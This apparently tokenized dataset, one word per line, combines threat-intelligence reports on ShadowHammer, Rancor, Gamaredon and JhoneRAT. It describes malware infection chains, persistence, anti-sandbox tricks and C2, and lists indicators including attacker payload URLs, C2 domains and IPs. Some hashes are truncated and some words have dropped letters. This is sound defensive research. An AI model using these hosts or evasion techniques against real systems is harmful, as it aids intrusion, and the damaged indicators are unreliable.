https://liveupdate01s.asus.com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER360.zip
.
 
ShadowHammer
:
https://liveupdate01s.asus.com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER359.zip
.
 
ShadowHammer
:
Liveupdate_Test_VER365.zip
.
 
ShadowHammer
:
aa15eb28292321b586c27d8401703494
.
 
Rancor
:
Cyber
Espionage
Group
Uses
New
Custom
Malware
to
Attack
Southeast
Asia
.
 
In
late
June
2018
,
Unit
42
revealed
a
previously
unknown
cyber
espionage
group
we
dubbed
Rancor
,
which
conducted
targeted
attacks
in
Southeast
Asia
throughout
2017
and
2018
.
 
In
recent
attacks
,
the
group
has
persistently
targeted
at
least
one
government
organization
in
Cambodia
from
December
2018
through
January
2019
.
 
While
researching
these
attacks
,
we
discovered
an
undocumented
,
custom
malware
family
which
we
ve
named
Dudell
.
 
In
addition
,
we
discovered
the
group
using
Derusbi
,
which
is
a
malware
family
believed
to
be
unique
to
a
small
subset
of
Chinese
cyber
espionage
groups
.
 
Between
early
December
2018
and
the
end
of
January
2019
,
Rancor
conducted
at
least
two
rounds
of
attacks
intending
to
install
Derusbi
or
KHRat
malware
on
victim
systems
.
 
January
2019
sent
via
149.28.156.61
to
deliver
either
Derusbi
or
KHRat
samples
with
either
cswksfwq.kfesv.xyz
or
connect.bafunpda.xyz
as
C2
.
 
DUDELL
:
SHA256
:
0d61d9baab9927bb484f3e60384fdb6a3709ca74bc6175ab16b220a68f2b349e
.
 
DUDELL
:
File
Type
:Microsoft
Excel
97
Document
.
 
DUDELL
:
File
Name
:Equipment
Purchase
List
2018-2020
Final
.xls
.
 
The
DUDELL
sample
is
a
weaponized
Microsoft
Excel
document
that
contains
a
malicious
macro
that
runs
on
the
victim
s
machine
.
 
It
shares
the
same
malicious
behavior
reported
by
Checkpoint
in
Rancor
:
The
Year
of
The
Phish
SHA-1
c829f5f9ff89210c888c1559bb085ec6e65232de
.
 
In
Check
Point
s
blog
,
the
sample
is
from
December
2018
while
this
sample
is
from
April
2018
.
 
The
macro
in
this
document
gets
executed
when
the
user
views
the
document
and
clicks
Enable
Content
,
at
which
point
the
macro
locates
and
executes
the
data
located
under
the
Company
field
in
the
document
s
properties
.
 
The
C2
server
199.247.6.253
is
known
to
be
used
by
the
Rancor
group
.
 
The
script
is
downloading
a
second
stage
payload
via
the
Microsoft
tool
msiexec
.
 
Unfortunately
at
the
time
of
discovery
,
the
hosted
file
is
unavailable
.
 
Our
systems
were
able
to
record
the
hash
of
file
tmp.vbs
,
but
the
contents
of
the
file
are
no
longer
available
.
 
Pivoting
off
the
filename
and
directory
,
we
discovered
a
similar
VBS
script
used
by
the
Rancor
actors
that
might
give
us
some
clues
on
what
the
contents
of
tmp.vbs
would
resemble
.
 
File
office.vbs
(
SHA256
:
4b0b319b58c2c0980390e24379a2e2a0a1e1a91d17a9d3e26be6f4a39a7afad2
)
was
discovered
in
directory
c:\Windows\System32\spool\drivers\color
.
 
Hashes
for
tmp.vbs
:b
958e481c90939962081b9fb85451a2fb28f705d5b5060f5d9d5aebfb390f8
.
 
If
the
file
tmp.vbs
does
in
fact
contain
similar
content
as
that
of
office.vbs
,
then
it
could
be
another
method
for
downloading
payloads
onto
the
target
.
 
DDKONG
Plugin
:
SHA256
:
0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707
.
 
DDKONG
Plugin
:
Compile
Date
and
Time
:
2017-02-17
08:33:45
AM
.
 
DDKONG
Plugin
:
File
Type
:
PE32
executable
(
DLL
)
Intel
80386,
for
MS
Windows
.
 
DDKONG
Plugin
:
File
Name
:
H
istory.nls
.
 
The
DllInstall
export
function
is
responsible
for
the
core
behavior
of
the
malware
,
as
just
loading
it
does
nothing
.
 
Once
this
export
is
called
,
it
checks
for
a
hidden
window
with
a
caption
of
Hello
Google
!
.
 
This
check
is
performed
to
ensure
that
only
one
instance
of
the
malware
is
running
at
a
time
.
 
The
hidden
window
created
by
the
malware
filters
on
any
user
input
(
e.g
.
 
keyboard
or
mouse
activity
)
.
 
This
could
be
an
attempt
to
evade
sandbox
analysis
as
mouse
and
keyboard
movement
is
typically
not
performed
.
 
The
malware
then
proceeds
to
beacon
to
a
configured
remote
server
of
cswksfwq.kfesv.xyz
on
TCP
port
8080
.
 
Upon
successful
connection
,
the
malware
transmits
victim
information
such
as
:
hostname
,
IP
address
,
Language
Pack
along
with
other
operating
system
information
.
 
The
data
transmitted
are
XOR
encoded
.
 
The
malware
supports
the
following
capabilities
:
Terminate
specific
processEnumerate
processesUpload
fileDownload
fileDelete
fileList
folder
contentsEnumerate
storage
volumesExecute
a
commandReverse
shellTake
a
screenshot
.
 
KHRAT
:
SHA256
:
aaebf987b8d80d71313c3c0f2c16d60874ffecbdda3bb6b44d6cba6d380
.
 
KHRAT
:
Compile
Date
and
Time
:
2018-05-02
05:22:23
PM
.
 
KHRAT
:
File
Type
:
PE32
executable
(
DLL
)
Intel
80386,
for
MS
Windows
.
 
KHRAT
:
File
Name
:
8081.dll
.
 
Rmcmd
:
When
the
DLL
is
initially
loaded
,
it
dynamically
resolves
and
imports
additional
modules
(
DLLs
)
needed
.
 
Once
loaded
and
the
export
entry
of
Rmcmd
is
called
,
it
creates
a
Windows
mutex
named
gkdflbmdfk
.
 
This
ensures
that
only
one
copy
of
the
malware
is
running
at
a
time
.
 
It
then
begins
to
beacon
to
a
configured
domain
of
connect.bafunpda.xyz
on
TCP
port
8081
.
 
The
malware
collects
and
transmits
data
from
the
host
,
such
as
hostname
and
is
XOR
encoded
with
the
first
byte
of
the
network
traffic
being
the
key
.
 
Reverse
Shell
:
The
malware
behavior
and
code
share
similarities
with
an
older
KHRAT
sample
from
May
2018
.
 
Sample
(
SHA256
:
bc1c3e754be9f2175b718aba62174a550cdc3d98ab9c36671a58073140381659
)
has
the
same
export
entry
name
and
is
also
a
reverse
shell
.
 
The
newer
sample
appears
to
be
a
re-write
for
optimization
purposes
with
the
underlying
behavior
remaining
the
same
,
reverse
shell
.
 
Derusbi
:
SHA256
:
83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2ab
.
 
Derusbi
:
Compile
Date
and
Time
:
2012-09-14
09:20:12
AM
.
 
Derusbi
:
File
Type
:P
E32
executable
(
DLL
)
Intel
80386,
for
MS
Windows
.
 
Derusbi
:
File
Name
:
32.dll
.
 
Derusbi
is
a
backdoor
Trojan
believed
to
be
used
among
a
small
group
of
attackers
,
which
includes
the
Rancor
group
.
 
This
particular
sample
is
a
loader
that
loads
an
encrypted
payload
for
its
functionality
.
 
This
DLL
requires
the
loading
executable
to
include
a
32-byte
key
on
the
command
line
to
be
able
to
decrypt
the
embedded
payload
,
which
unfortunately
we
do
not
have
.
 
Even
though
we
dont
have
the
decryption
key
or
loader
,
we
have
uncovered
some
interesting
artifacts
.
 
If
the
module
that
loads
the
sample
is
named
myapp.exe
the
module
will
exit
Once
loaded
,
it
sleeps
for
six
seconds
.
 
Looks
for
a
Windows
pipe
named
\\.\pipe\_kernel32.dll.ntdll.dll.user32.dll
.
 
Looks
for
a
Windows
device
named
\Device\acpi_010221
.
 
n
July
2019
,
we
discovered
an
interesting
VBScript
named
Chrome.vbs
(
SHA256
:
0C3D4DFA566F3064A8A408D3E1097C454662860BCACFB6675D2B72739CE449C2
)
associated
with
the
Rancor
group
.
 
This
particular
VBScript
payload
beacons
to
domain
bafunpda.xyz
,
which
is
also
used
by
the
KHRAT
Trojan
listed
above
in
Table
2
.
 
This
VBScript
is
obfuscated
and
contains
packed
data
that
is
used
to
infect
a
target
with
multiple
chained
persistent
artifacts
.
 
The
MOF
file
created
by
the
VBScript
is
used
as
a
persistence
mechanism
via
Windows
Management
Instrumentation
(
WMI
)
Event
Subscriptions
.
 
MOF
files
are
compiled
scripts
that
describe
Common
Information
Model
(
CIM
)
classes
,
which
are
compiled
into
the
WMI
repository
.
 
The
technique
is
described
by
MITRE
ATT&CK
IDT1084
.
 
This
particular
MOF
file
creates
a
timer
event
that
is
triggered
every
five
seconds
.
 
The
DLL
located
in
the
Media
registry
key
is
a
variant
of
the
KHRAT
Trojan
.
 
It
beacons
to
domain
connect.bafunpda.xyz
and
attempts
to
connect
to
TCP
port
4433
.
 
This
is
the
same
domain
used
by
the
KHRAT
Trojan
.
 
Rancor
,
a
cyber
espionage
group
active
since
at
least
2017
,
continues
to
conduct
targeted
attacks
in
Southeast
Asia
and
has
been
found
using
an
undocumented
,
custom
malware
family
which
we
ve
dubbed
Dudell
to
download
a
second
stage
payload
once
its
malicious
macro
is
executed
.
 
Additionally
,
Rancor
is
also
using
the
Derusbi
malware
family
to
load
a
secondary
payload
once
it
infiltrates
a
target
.
 
Rancor
:
0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707
.
 
Rancor
:
AAEBF987B8D80D71313C3C0F2C16D60874FFECBDDA3BB6B44D6CBA6D38031609
.
 
Rancor
:
0D61D9BAAB9927BB484F3E60384FDB6A3709CA74BC6175AB16B220A68F2B349E
.
 
Rancor
:
DB982B256843D8B6429AF24F766636BB0BF781B471922902D8DCF08D0C58511E
.
 
Rancor
:
CC081FFEA6F4769733AF9D0BAE0308CA0AE63667FA225E7965DF0884E96E2D2A
.
 
Rancor
:
BC1C3E754BE9F2175B718ABA62174A550CDC3D98AB9C36671A58073140381659
.
 
Rancor
:
83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2abd9e0d
.
 
Rancor
:
cswksfwq.kfesv.xyz
.
 
Rancor
:
Connect.bafunpda.xyz
.
 
Rancor
:
199.247.6.253
.
 
Cyberwarfare
:
A
deep
dive
into
the
latest
Gamaredon
Espionage
Campaign
.
 
Gamaredon
Group
is
a
Cyber
Espionage
persistent
operation
attributed
to
Russians
FSB
(
Federal
Security
Service
)
in
a
long-term
military
and
geo-political
confrontation
against
the
Ukrainian
government
and
more
in
general
against
the
Ukrainian
military
power
.
 
Gamaredon
has
been
active
since
2014
,
and
during
this
time
,
the
modus
operandi
has
remained
almost
the
same
.
 
The
most
used
malware
implant
is
dubbed
Pteranodon
or
Pterodo
and
consists
of
a
multistage
backdoor
designed
to
collect
sensitive
information
or
maintaining
access
on
compromised
machines
.
 
It
is
distributed
in
a
spear
phishing
campaign
with
a
weaponized
ofce
document
that
appears
to
be
designed
to
lure
military
personnel
.
 
In
the
recent
months
,
Ukrainian
CERT
(
CERT-UA
)
reported
an
intensication
of
Gamaredon
Cyberattacks
against
military
targets
.
 
The
new
wave
dates
back
to
the
end
of
November
2019
and
was
rst
analyzed
by
Vitali
Kremez
.
 
Starting
from
those
ndings
,
Cybaze-Yoroi
ZLab
team
decided
to
deep
dive
into
a
technical
analysis
of
the
latest
Pterodo
implant
.
 
The
complex
infection
chain
begins
with
a
weaponized
Ofce
document
named
f.doc
.
 
Hash
:
76ea98e1861c1264b340cf3748c3ec74473b04d042cd6bfda9ce51d086cb5a1a
Threat
:
Gamaredon
Pteranodon
weaponized
document
.
 
Brief
Description
:
Doc
le
weaponized
with
Exploit
.
 
Ssdeep
:
768:u0foGtYZKQ5QZJQ6hKVsEEIHNDxpy3TI3dU4DKfLX9Eir
:
uG1aKQ5OwCrItq3TgGfLt9r
.
 
The
decoy
document
is
written
using
the
ukrainian
language
mixed
to
many
special
chars
aimed
to
lure
the
target
to
click
on
it
.
 
The
document
leverages
the
common
exploit
aka
template
injection
and
tries
to
download
a
second
stage
from
http://win-apu.ddns.net/apu.dot
.
 
Thanks
to
this
exploit
(
Remote
Code
Execution
exploit
)
the
user
interaction
is
not
required
,
in
fact
the
enable
macro
button
is
not
shown
.
 
The
downloaded
document
has
a
.dot
extension
,
used
by
Microsoft
Ofce
to
save
templates
for
different
documents
with
similar
formats
.
 
Basic
Information
on
the
.dot
le
are
provided
:
Hash
:
e2cb06e0a5c14b4c5f58d0e56a1dc10b6a1007cf56c77ae6cb07946c3dfe82d8
.
 
Threat
:
Gamaredon
Pteranodon
loader
dot
le
.
 
Brief
Description
:
Dot
le
enabling
the
infection
of
the
Gamaredon
Pteranodon
.
 
Ssdeep
:
768:5KCB8tnh7oferuHpC0xw+hnF4J7EyKfJ
:
oI8XoWruHpp/P4
.
 
If
we
decide
to
open
the
document
,
we
see
that
the
document
is
empty
,
but
it
requires
the
enabling
of
the
macro
.
 
The
body
of
the
macro
can
be
logically
divided
into
two
distinct
parts
:
The
rst
one
is
the
setting
of
the
registry
key
HKEY_CURRENT_USER\Software\Microsoft\Ofce\
&
Application.Version
&
_
\Word\Security\
and
the
declaration
of
some
other
variables
,
such
as
the
dropurl
geticons.ddns.net
.
 
The
second
one
is
the
setting
of
the
persistence
mechanism
through
the
writing
of
the
vbs
code
in
the
Startup
folder
with
name
templates.vbs
.
 
This
vbs
is
properly
the
macro
executed
by
the
macro
engine
of
word
.
 
Analyzing
the
content
of
templates.vbs
it
is
possible
to
notice
that
it
dene
a
variable
containing
a
URL
like
http://geticons.ddns.net/ADMIN-PC_E42CAF54//autoindex
.
 
]php
obtained
from
hxp://get-icons.ddns
.
 
]net/
&
NlnQCJG
&
_
&
uRDEJCn
&
//autoindex
.
 
]php
,
where
NlnQCJG
is
the
name
that
identies
the
computer
on
the
network
and
uRDEJCn
is
the
serial
number
of
drive
in
hexadecimal
encoding
.
 
From
this
URL
it
tries
to
download
another
stage
then
storing
it
into
C:\Users\admin\AppData\Roaming\
path
with
random
name
.
 
At
the
end
,
templates.vbs
script
will
force
the
machine
to
reboot
.
 
The
dropped
sample
is
an
SFX
archive
,
like
the
tradition
of
Gamaredon
implants
.
 
Hash
:
c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f
.
 
Threat
:
Gamaredon
Pteranodon
implant
SFX
archive
.
 
Brief
Description
:
SFX
Archive
First
Stage
.
 
Ssdeep
:
24576:zXwOrRsTQlIIIIwIEuCRqKlF8kmh/ZGg4kAL/WUKN7UMOtcv
:
zgwR/lIIIIwI6RqoukmhxGgZ+WUKZUMv
.
 
By
simply
opening
the
SFX
archive
,
it
is
possible
to
notice
two
different
les
that
are
shown
below
and
named
respectively
8957.cmd
and
28847
.
 
When
executed
,
the
SFX
archive
will
be
extracted
and
the
8957.cmd
will
be
run
.
 
At
this
point
,
the
batch
script
renames
the
28847
le
in
28847.exe
,
opens
it
using
pjk
,fkbcerbgblfhs
as
password
and
the
le
contained
inside
the
28847.exe
le
will
be
renamed
in
WuaucltIC.exe
.
 
Finally
,
it
will
be
run
using
post.php
as
argument
.
 
The
fact
that
the
28847.exe
le
can
be
opened
makes
us
understand
that
the
28847
le
is
another
SFX
le
.
 
Some
static
information
about
SFX
are
:
Hash
:
3dfadf9f23b4c5d17a0c5f5e89715d239c832dbe78551da67815e41e2000fdf1
.
 
Threat
:
Gamaredon
Pteranodon
implant
SFX
archive
.
 
Brief
Description
:
SFX
Archive
Second
Stage
.
 
Ssdeep
:
24576:vmoO8itbaZiW+qJnmCcpv5lKbbJAiUqKXM
:
OoZwxVvfoaPu
.
 
Exploring
it
,
it
is
possible
to
see
several
les
inside
of
it
,
as
well
as
the
6323
le
.
 
In
this
case
,
the
SFX
archive
contains
8
les
:
ve
of
them
are
legit
DLLs
used
by
the
6323
executable
to
interoperate
with
the
OLE
format
dened
and
used
by
Microsoft
Ofce
.
 
The
ExcelMyMacros.txt
and
wordMacros.txt
les
contain
further
macro
script
,
described
next
.
 
So
,
static
analysis
on
the
6323
le
shown
as
its
nature
:
it
is
written
using
Microsoft
Visual
Studio
.NET
,
therefore
easily
to
reverse
.
 
Before
reversing
the
executable
,
it
is
possible
to
clean
it
allowing
the
size
reduction
and
the
junk
instruction
reduction
inside
the
code
.
 
The
below
image
shows
the
information
about
the
sample
before
and
after
the
cleaning
.
 
The
rst
check
performed
is
on
the
arguments
:
if
the
arguments
length
is
equal
to
zero
,
the
malware
terminates
the
execution
.
 
After
that
,
the
malware
checks
if
the
existence
of
the
les
ExcelMyMacros.txt
and
wordMacros.txt
in
the
same
path
where
it
is
executed
:
if
true
then
it
reads
their
contents
otherwise
it
will
exit
.
 
As
visible
in
the
previous
gure
,
the
only
difference
between
the
les
are
in
the
variable
,
registry
key
and
path
used
by
Word
rather
than
by
Excel
.
 
Finally
the
macros
are
executed
using
the
Ofce
engine
.
 
So
let
s
start
to
dissect
the
macros
.
 
For
a
better
comprehension
we
will
be
considering
only
one
macro
and
in
the
specic
case
we
will
analyze
wordMacros.txt
ones
.
 
First
of
all
the
macro
will
set
the
registry
key
HKEY_CURRENT_USER\Software\Microsoft\Ofce\
&
Application.Version
&
_
\Word\Security\
and
then
will
set
up
two
scheduled
tasks
that
will
start
respectively
every
12
and
15
minutes
:
the
rst
one
will
run
a
IndexOfce.vbs
in
the
path
%APPDATA%\Microsoft\Ofce\
and
the
second
one
will
run
IndexOfce.exe
in
the
same
path
.
 
Finally
,
the
malware
will
write
the
IndexOfce.txt
le
in
the
%APPDATA%\Microsoft\Ofce\
path
.
 
The
script
will
check
the
presence
of
the
IndexOfce.exe
artifact
:
if
true
then
it
will
delete
it
and
it
will
download
a
new
le/script
from
http://masseffect.space/<PC_Name>_<Hex_Drive_SN>/post.php
.
 
The
malware
tries
to
save
the
C2
response
and
encoding
it
using
Encode
function
.
 
This
function
accepts
three
parameters
:
the
input
le
,
the
output
le
and
the
arrKey
;
arrKey
is
calculated
thanks
to
GetKey
function
that
accepts
as
input
the
Hexadecimal
value
of
the
Driver
SN
installed
on
the
machine
and
returns
the
key
as
results
.
 
Gamaredon
cyberwarfare
operations
against
Ukraine
are
still
active
.
 
This
technical
analysis
reveals
that
the
modus
operandi
of
the
Group
has
remained
almost
identical
over
the
years
.
 
The
massive
use
of
weaponized
Ofce
documents
,
Ofce
template
injection
,
sfx
archives
,
wmi
and
some
VBA
macro
stages
that
dinamically
changes
,
make
the
Pterodon
attack
chain
very
malleable
and
adaptive
.
 
However
,
the
introduction
of
a
.Net
component
is
a
novelty
compared
to
previous
Pterodon
samples
.
 
Gamaredon
:
76ea98e1861c1264b340cf3748c3ec74473b04d042cd6bfda9ce51d086cb5a1a
.
 
Gamaredon
:
e2cb06e0a5c14b4c5f58d0e56a1dc10b6a1007cf56c77ae6cb07946c3dfe82d8
.
 
Gamaredon
:
def13f94cdf793df3e9b42b168550a09ee906f07f61a3f5c9d25ceca44e8068c
.
 
Gamaredon
:
c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f
.
 
Gamaredon
:
86977a785f361d4f26eb3e189293c0e30871de3c93b19653c26a31dd4ed068cc
.
 
Gamaredon
:
http://win-apu.ddns.net/apu.dot/
.
 
Gamaredon
:
http://get-icons.ddns.net/apu.dot/
.
 
Gamaredon
:
http://masseffect.space/
.
 
JhoneRAT
:
Cloud
based
python
RAT
targeting
Middle
Eastern
countries
.
 
Today
,
Cisco
Talos
is
unveiling
the
details
of
a
new
RAT
we
have
identified
we
're
calling
"
JhoneRAT
"
.
 
This
new
RAT
is
dropped
to
the
victims
via
malicious
Microsoft
Office
documents
.
 
The
dropper
,
along
with
the
Python
RAT
,
attempts
to
gather
information
on
the
victim
's
machine
and
then
uses
multiple
cloud
services
:
Google
Drive
,
Twitter
,
ImgBB
and
Google
Forms
.
 
The
RAT
attempts
to
download
additional
payloads
and
upload
the
information
gathered
during
the
reconnaissance
phase
.
 
This
particular
RAT
attempts
to
target
a
very
specific
set
of
Arabic-speaking
countries
.
 
The
filtering
is
performed
by
checking
the
keyboard
layout
of
the
infected
systems
.
 
Based
on
the
analysed
sample
,
JhoneRAT
targets
Saudi
Arabia
,
Iraq
,
Egypt
,
Libya
,
Algeria
,
Morocco
,
Tunisia
,
Oman
,
Yemen
,
Syria
,
UAE
,
Kuwait
,
Bahrain
and
Lebanon
.
 
The
campaign
shows
an
actor
that
developed
a
homemade
RAT
that
works
in
multiple
layers
hosted
on
cloud
providers
.
 
JhoneRAT
is
developed
in
python
but
not
based
on
public
source
code
,
as
it
is
often
the
case
for
this
type
of
malware
.
 
The
attackers
put
great
effort
to
carefully
select
the
targets
located
in
specific
countries
based
on
the
victim
's
keyboard
layout
.
 
Everything
starts
with
a
malicious
document
using
a
well-known
vulnerability
to
download
a
malicious
document
hosted
on
the
internet
.
 
For
this
campaign
,
the
attacker
chose
to
use
a
cloud
provider
(
Google
)
with
a
good
reputation
to
avoid
URL
blacklisting
.
 
The
malware
is
divided
into
a
couple
of
layers
each
layer
downloads
a
new
payload
on
a
cloud
provider
to
get
the
final
RAT
developed
in
python
and
that
uses
additional
providers
such
as
Twitter
and
ImgBB
.
 
This
RAT
is
a
good
example
of
how
a
highly
focused
attack
that
tries
to
blend
its
network
traffic
into
the
crowd
can
be
highly
effective
.
 
In
this
campaign
,
focusing
detection
of
the
network
is
not
the
best
approach
.
 
Instead
,
the
detection
must
be
based
on
the
behaviour
on
the
operating
system
.
 
Attackers
can
abuse
well-known
cloud
providers
and
abuse
their
reputations
in
order
to
avoid
detection
.
 
The
fact
that
this
attacker
decided
to
leverage
cloud
services
and
four
different
services
and
not
their
own
infrastructure
is
smart
from
an
opsec
point
of
view
.
 
It
is
hard
for
the
targets
to
identify
legitimate
and
malicious
traffic
to
cloud
provider
infrastructure
.
 
Moreover
,
this
kind
of
infrastructure
uses
HTTPS
and
the
flow
is
encrypted
that
makes
man-in-the-middle
interception
more
complicated
for
the
defender
.
 
It
is
not
the
first
time
an
attacker
used
only
cloud
providers
.
 
Even
while
using
these
services
,
the
authors
of
this
JhoneRAT
went
further
and
used
different
user-agent
strings
depending
on
the
request
,
and
even
on
the
downloaders
the
authors
used
other
user-agent
strings
.
 
We
already
published
a
couple
of
articles
about
ROKRAT
(
here
,
here
,
here
and
here
)
where
another
unrelated
actor
,
Group123
,
made
the
same
choice
but
with
different
providers
.
 
The
attacker
implemented
filtering
based
on
the
keyboard
's
layout
.
 
The
malware
is
executed
only
for
the
following
layout
,
the
country
is
based
on
the
Microsoft
website
:
'
0401
'
:
Saudi
Arabia
.
 
'
0801
'
:
Iraq
.
 
'
0c01
'
:
Egypt
.
 
'
1001
'
:
Libya
.
 
'
1401
'
:
Algeria
.
 
'
1801
'
:
Morocco
.
 
'
1c01
'
:
Tunisia
.
 
'
2001
'
:
Oman
.
 
'
2401
'
:
Yemen
.
 
'
2801
'
:
Syria
.
 
'
3801
'
:
UAE
.
 
'
3401
'
:
Kuwait
.
 
'
3c01
'
:
Bahrain
.
 
'
3001
'
:
Lebanon
.
 
We
identified
three
malicious
Microsoft
Office
documents
that
download
and
load
an
additional
Office
document
with
a
Macro
.
 
The
oldest
one
from
November
2019
,
named
"
Urgent.docx
"
.
 
The
author
of
the
document
asks
to
enable
editing
in
English
and
in
Arabic
.
 
The
second
document
from
the
beginning
of
January
is
named
"
fb.docx
"
and
contains
usernames
and
passwords
from
an
alleged
"
Facebook
"
leak
.
 
The
more
recent
document
is
from
mid-January
and
alleged
to
be
from
a
United
Arab
Emirate
organization
.
 
The
author
blurred
the
content
and
asks
the
user
to
enable
editing
to
see
the
content
.
 
In
the
three
documents
,
an
additional
Office
document
containing
a
Macro
is
downloaded
and
executed
.
 
The
documents
are
located
on
Google
Drive
.
 
The
template
located
on
Google
Drive
contains
a
macro
.
 
The
macro
contains
a
virtual
machine
detection
technique
based
on
the
serial
number
of
the
disks
available
in
the
victim
environment
.
 
Indeed
,
some
VMs
do
not
have
serial
numbers
and
the
macro
is
executed
only
if
a
serial
number
exists
.
 
A
WMIC
command
is
executed
to
get
this
information
on
the
targeted
system
.
 
If
a
serial
number
exists
,
the
rest
of
the
code
is
executed
.
 
The
purpose
is
to
download
an
image
from
a
new
Google
Drive
link
.
 
It
is
interesting
to
note
that
the
filename
of
the
downloaded
image
is
randomly
generated
based
on
a
dictionary
:
Array
("cartoon"
,
"img"
,"photo")
.
 
The
filename
will
be
cartoon.jpg
or
img.jpg
or
photo.jpg
and
the
image
usually
depicts
a
cartoon
.
 
The
image
file
is
a
real
image
with
a
base64-encoded
binary
appended
at
the
end
.
 
The
malware
author
has
a
curious
sense
of
humor
.
 
The
base64
data
and
image
are
separated
by
the
"
****
"
string
.
 
The
decoded
binary
filename
is
also
randomly
generated
based
on
a
dictionary
:
Array("proc"
,
"chrome"
,
"winrar")
.
 
It
can
be
proc.exe
or
chrome.exe
or
winrar.exe
.
 
The
decoded
base64
data
is
an
AutoIT
binary
.
 
This
binary
downloads
a
new
file
on
Google
Drive
.
 
The
filename
is
also
randomly
generated
based
on
a
dictionary
$ARRAY[5]=["prc"
,"winrar"
,"chrome"
,"sync"
,"COM
surr"]
.
 
The
final
payload
is
a
remote
access
tool
(
RAT
)
written
in
python
.
 
We
named
this
RAT
"
JhoneRAT
"
.
 
The
python
code
is
wrapped
into
an
executable
using
pyinstaller
.
 
It
uses
minimal
obfuscation
applied
only
on
variables
and
function
naming
.
 
The
RAT
starts
by
launching
three
threads
.
 
The
first
is
responsible
for
checking
if
the
system
has
the
targeted
keyboard
layout
this
is
exclusively
in
Arabic-speaking
countries
.
 
The
second
will
create
the
persistence
and
,
finally
,
the
last
one
to
be
started
is
the
main
cycle
for
the
RAT
.
 
As
we
explained
before
,
the
RAT
targets
specific
countries
by
checking
the
keyboard
's
layout
.
 
In
fact
,
this
is
one
of
the
first
checks
it
performs
when
it
is
executed
.
 
The
persistence
is
achieved
by
adding
an
entry
with
the
name
"
ChromeUpdater
"
to
the
'
Software\\Microsoft\\Windows\\CurrentVersion\\Run
'
.
 
This
RAT
uses
three
different
cloud
services
to
perform
all
its
command
and
control
(
C2
)
activities
.
 
It
checks
for
new
commands
in
the
tweets
from
the
handle
@jhone87438316
(
suspended
by
Twitter
)
every
10
seconds
using
the
BeautifulSoup
HTML
parser
to
identify
new
tweets
.
 
These
commands
can
be
issued
to
a
specific
victim
based
on
the
UID
generated
on
each
target
(
by
using
the
disk
serial
and
contextual
information
such
as
the
hostname
,
the
antivirus
and
the
OS
)
or
to
all
of
them
.
 
The
Exfiltration
,
however
,
is
done
via
other
cloud
providers
.
 
The
screenshots
are
exfiltrated
via
the
ImgBB
website
.
 
The
remaining
commands
send
feedback
by
posting
data
into
Google
Forms
.
 
Finally
,
the
RAT
is
able
to
download
files
encoded
in
base64
on
Google
Drive
.
 
Feature-wise
,
the
RAT
has
three
commands
:
Take
a
screenshot
and
upload
it
to
ImgBB
.
 
Download
binary
disguised
has
a
picture
from
Google
Drive
and
execute
it
.
 
Execute
a
command
and
send
the
output
to
Google
Forms
.
 
The
attacker
put
a
couple
of
tricks
in
place
to
avoid
execution
on
virtual
machines
(
sandbox
)
.
 
The
first
trick
is
the
check
of
the
serial
number
of
the
disk
.
 
The
actor
used
the
same
technique
in
the
macro
and
in
the
JhoneRAT
.
 
By
default
,
most
of
the
virtual
machines
do
not
have
a
serial
number
on
the
disk
.
 
The
attacker
used
a
second
trick
to
avoid
analysis
of
the
python
code
.
 
The
actor
used
the
same
trick
that
FireEye
in
the
Flare-On
6
:
Challenge
7:
They
removed
the
header
of
the
python
bytecode
.
 
It
can
be
perfectly
executed
without
the
header
,
but
tools
such
as
uncompyle6
need
this
header
:
$
uncompyle6
final2
.
 
ImportError
:
Unknown
magic
number
227
in
final2
.
 
Additionally
,
the
generated
code
by
uncompyle6
varies
depending
on
the
version
and
the
impact
is
important
.
 
Based
on
our
analysis
and
the
behaviour
of
the
executed
malware
,
the
correct
interpretation
is
the
first
one
based
on
the
oldest
version
of
uncompyle6
.
 
For
this
specific
condition
,
it
is
important
because
it
's
filtering
on
the
keyboard
layout
to
identify
the
targets
.
 
This
campaign
shows
a
threat
actor
interested
in
specific
Middle
Eastern
and
Arabic-speaking
countries
.
 
It
also
shows
us
an
actor
that
puts
effort
in
opsec
by
only
using
cloud
providers
.
 
The
malicious
documents
,
the
droppers
and
the
RAT
itself
are
developed
around
cloud
providers
.
 
Additionally
the
attackers
implemented
anti-VM
(
and
sandbox
)
and
anti-analysis
tricks
to
hide
the
malicious
activities
to
the
analyst
.
 
For
example
,
the
VM
or
the
sandbox
must
have
the
keyboard
layout
of
the
targeted
countries
and
a
disk
serial
number
.
 
This
campaign
started
in
November
2019
and
it
is
still
ongoing
.
 
At
this
time
,
the
API
key
is
revoked
and
the
Twitter
account
is
suspended
.
 
However
,
the
attacker
can
easily
create
new
accounts
and
update
the
malicious
files
in
order
to
still
work
.
 
This
campaign
shows
us
that
network-based
detection
is
important
but
must
be
completed
by
system
behaviour
analysis
.
 
JhoneRAT
:
273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f
.
 
JhoneRAT
:
29886dbbe81ead9e9999281e62ecf95d07acb24b9b0906b28beb65a84e894091
.
 
JhoneRAT
:
d5f10a0b5c103100a3e74aa9014032c47aa8973b564b3ab03ae817744e74d079
.
 
JhoneRAT
:
6cc0c11c754e1e82bca8572785c27a364a18b0822c07ad9aa2dc26b3817b8aa4
.
 
JhoneRAT
:
7e1121fca3ac7c2a447b61cda997f3a8202a36bf9bb08cca3402df95debafa69
.
 
JhoneRAT
:
b4a43b108989d1dde87e58f1fd6f81252ef6ae19d2a5e8cd76440135e0fd6366
.
 
JhoneRAT
:
https://drive.google.com/uc?export=download&amp;id=1vED0wN0arm9yu7C7XrbCdspLjpoPKfrQ
.
 
JhoneRAT
:
https://drive.google.com/uc?export=download&amp;id=1LVdv4bjcQegPdKrc5WLb4W7ad6Zt80zl
.
 
JhoneRAT
:
https://drive.google.com/uc?export=download&amp;id=1OlQssMvjb7gI175qDx8SqTgRJIEp5Ypd
.
 
JhoneRAT
:
https://drive.google.com/uc?export=download&id=1d-toE89QnN5ZhuNZIc2iF4-cbKWtk0FD
.
 
JhoneRAT
:
